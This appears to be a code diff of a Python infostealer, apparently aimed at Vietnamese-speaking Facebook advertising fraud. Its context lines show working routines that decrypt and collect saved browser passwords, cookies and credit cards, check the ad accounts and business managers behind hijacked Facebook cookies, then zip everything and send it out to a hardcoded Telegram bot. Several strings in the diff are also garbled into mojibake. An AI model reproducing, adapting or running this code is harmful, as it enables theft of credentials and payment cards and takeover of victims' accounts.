@@ -1,5 +1,6 @@
-import sys
-sys.path.append(r'C:\\Users\\hi\\Downloads\\Env\\Lib\\site-packages')
+
+# import sys
+# sys.path.append(r'C:\\Users\\hi\\Downloads\\Env\\Lib\\site-packages')
 
 import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile, io, datetime, hmac, subprocess
 from websocket import create_connection
@@ -22,11 +23,11 @@ Data_Path = f"{TMP}\\{os.getenv('COMPUTERNAME', 'defaultValue')}"
 TOKEN_BOT = "7556012901:AAErRshjDqSU35BXyDcKv0TpQ7oMVAKKUu0"
 
 CHAT_ID_NEW = "-4596211095"
-CHAT_ID_RESET = "-4516122864" 
+CHAT_ID_RESET = "-4516122864"
 browsers = []
 creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')
 
-ch_dc_browsers = {   
+ch_dc_browsers = {
 	"Chromium": f"{LocalAppData}\\Chromium\\User Data",
 	"Thorium": f"{LocalAppData}\\Thorium\\User Data",
 	"Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
@@ -73,14 +74,14 @@ ch_dc_browsers = {
     "Discord PTB": f'{AppData}\\discordptb'
 }
 
-def installed_ch_dc_browsers(): 
+def installed_ch_dc_browsers():
     results = []
     for browser, path in ch_dc_browsers.items():
         if os.path.exists(path):
             results.append(browser)
     return results
 
-def get_ch_master_key(path): 
+def get_ch_master_key(path):
     try:
         with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
             c = f.read()
@@ -97,7 +98,7 @@ def get_ch_master_key(path):
     except:
         return None
 
-def decrypt_ch_value(buff, ch_master_key=None): 
+def decrypt_ch_value(buff, ch_master_key=None):
     try:
         starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
         if starts == "v10" or starts == "v11":
@@ -194,7 +195,7 @@ class Facebook():
         headers = {'authority': 'adsmanager.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','viewport-width': '794'}
         self.rq.headers.update(headers)
         self.rq.cookies.update(cookies)
-        self.token = self.Get_Market()  
+        self.token = self.Get_Market()
         if self.token == False:
             return None
         else:
@@ -211,7 +212,7 @@ class Facebook():
                     cookies[key] = value
         return cookies
 
-    def Get_Market(self): 
+    def Get_Market(self):
         try:
             act = self.rq.get('https://adsmanager.facebook.com/adsmanager/manage')
             list_data = act.text
@@ -238,7 +239,7 @@ class Facebook():
                 try:
                     statut = data["account_status"]
                 except:
-                    statut = "Không Rõ Trạng Thái"
+                    statut = "KhÃ´ng RÃµ Tráº¡ng ThÃ¡i"
                 if int(statut) == 1:
                     stt = "Live"
                 else:
@@ -258,19 +259,19 @@ class Facebook():
                             nguong_no = nguong_no //100
                         except:pass
                 except:
-                    nguong_no = "Không Thẻ"
-                datax += f"- Tên TKQC: {name}|ID_TKQC: {id_tkqc}|Trạng Thái: {stt}|Tiền Tệ: {tien_te}|Đã Tiêu Vào Ngưỡng: {du_no}|Tổng Đã Chi Tiêu: {da_chi_tieu}|Limit Ngày:{limit_ngay}|Ngưỡng Nợ: {nguong_no}|Ngày Tạo:{created_time[:10]}\n"
-            datax = f"Tổng Số TKQC: {str(len(list_tikqc.json()['data']))}\n{datax}"
+                    nguong_no = "KhÃ´ng Tháº»"
+                datax += f"- TÃªn TKQC: {name}|ID_TKQC: {id_tkqc}|Tráº¡ng ThÃ¡i: {stt}|Tiá»n Tá»‡: {tien_te}|ÄÃ£ TiÃªu VÃ o NgÆ°á»¡ng: {du_no}|Tá»•ng ÄÃ£ Chi TiÃªu: {da_chi_tieu}|Limit NgÃ y:{limit_ngay}|NgÆ°á»¡ng Ná»£: {nguong_no}|NgÃ y Táº¡o:{created_time[:10]}\n"
+            datax = f"Tá»•ng Sá»‘ TKQC: {str(len(list_tikqc.json()['data']))}\n{datax}"
             return datax
-        except:return 'Không Có TKQC'
+        except:return 'KhÃ´ng CÃ³ TKQC'
         
-    def Get_Page(self): 
+    def Get_Page(self):
         try:
             List_Page = f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={self.token}"
             data = self.rq.get(List_Page)    
             if 'data' in data.json():
                 pages = data.json()["data"]
-                data = f"Tổng Số Page: {str(len(pages))}\n"
+                data = f"Tá»•ng Sá»‘ Page: {str(len(pages))}\n"
                 for page in pages:
                     name = page["name"]
                     link = page["link"]
@@ -283,7 +284,7 @@ class Facebook():
                 return "Page: 0"
         except:pass
 
-    def Get_QTV_Gr(self): 
+    def Get_QTV_Gr(self):
         try:
             get_group = f"https://graph.facebook.com/v17.0/me/groups?fields=administrator,member_count&limits=1500&access_token={self.token}"
             list_group = self.rq.get(get_group).text
@@ -297,7 +298,7 @@ class Facebook():
             return ids
         except:return 'QTV Group : 0'
     
-    def Get_id_BM(self):   
+    def Get_id_BM(self):
         List_BM = f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}"
         data = self.rq.get(List_BM)
         try:
@@ -315,7 +316,7 @@ class Facebook():
         try:
             listbm = self.Get_id_BM()
             if not listbm:
-                return "Không Có BM"
+                return "KhÃ´ng CÃ³ BM"
             result = ''
             for idbm,name in listbm:
                 count_bm = self.Check_Slot_BM(idbm)
@@ -420,7 +421,7 @@ def save_gck_login_data(profiles, profile_name, browser_name):
                 logins.append((row["hostname"], decodeLoginData(getKey(profile), encUsername), decodeLoginData(getKey(profile), encPassword)))
 
             for login in logins:
-                login_data += f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {login[2]}\nApplication: {browser_name} [Profile: {profile_name}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                login_data += f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {login[2]}\nApplication: {browser_name} [Profile: {profile_name}]\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
                 count += 1
         except:
             continue
@@ -461,7 +462,7 @@ def get_gck_profiles(basepath):
 
     return profiles
 
-def get_ch_login_data(browser, path, profile, ch_master_key): 
+def get_ch_login_data(browser, path, profile, ch_master_key):
     result = ""
     count = 0
     if not os.path.exists(f"{path}\\{profile}\\Login Data"):
@@ -476,7 +477,7 @@ def get_ch_login_data(browser, path, profile, ch_master_key):
     for row in cursor.fetchall():
         if row[0] and row[1]:
             password = decrypt_ch_value(row[2], ch_master_key)
-            result += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            result += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
             count += 1
     if count > 0:
         if not os.path.exists(Data_Path):
@@ -569,7 +570,7 @@ def process_facebook_cookies():
                 if not os.path.exists(Data_Path):
                     os.makedirs(Data_Path)
                 with open(os.path.join(Data_Path, "Facebook_Cookies.txt"), 'a', encoding='utf-8') as f:
-                    f.write(f"\nCookie: {fb_formatted}\n\n{ads_check}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                    f.write(f"\nCookie: {fb_formatted}\n\n{ads_check}\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
 def save_gck_cookies(profiles, profile_name, browser_name):
     count = 0
     cookies_data = []
@@ -636,7 +637,7 @@ def get_ch_ccards(browser, path, profile, ch_master_key):
         if not row[0] or not row[1] or not row[2] or not row[3]:
             continue
         card_number = decrypt_ch_value(row[3], ch_master_key)
-        result += f"Card Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.datetime.fromtimestamp(row[4])}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        result += f"Card Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.datetime.fromtimestamp(row[4])}\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
         count += 1
 
     if count > 0:
@@ -745,7 +746,7 @@ zip_data = io.BytesIO()
 archive_path = os.path.join(TMP, f"[{CountryCode}_{SEIP}] {os.getenv('COMPUTERNAME', 'defaultValue')}.zip")
 
 with zipfile.ZipFile(zip_data, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
-    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/muabanuytinde".encode()
+    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/Xmeta".encode()
 
     for root, _, files in os.walk(Data_Path):
         for name in files:
@@ -761,13 +762,13 @@ with open(archive_path, "wb") as f:
 with open(archive_path, "wb") as f:
     f.write(zip_data.getbuffer())
 
-message_body = f"{GetIPD}\nUser: {os.getlogin()}\nBrowser Data: CK: {total_browsers_cookies_count}|PW: {total_browsers_logins_count}|CC: {total_browsers_ccards_count}\n"
+message_body = f"{GetIPD}\nUser: {os.getlogin()}\nBrowser Data: CK: {total_browsers_cookies_count}|Pass: {total_browsers_logins_count}|CC: {total_browsers_ccards_count}\n"
 
 for i in range(10):
     if Count == 1:
-        CHAT_ID = CHAT_ID_NEW 
+        CHAT_ID = CHAT_ID_NEW #Sv Data Má»›i
     else:
-        CHAT_ID = CHAT_ID_RESET 
+        CHAT_ID = CHAT_ID_RESET #Sv Data Update (Send tá»« láº§n 2)
 
     try:
         with open(archive_path, "rb") as f:
@@ -786,5 +787,4 @@ shutil.rmtree(Data_Path, ignore_errors=True)
 
 if os.path.exists(archive_path):
     os.remove(archive_path)
-    
     
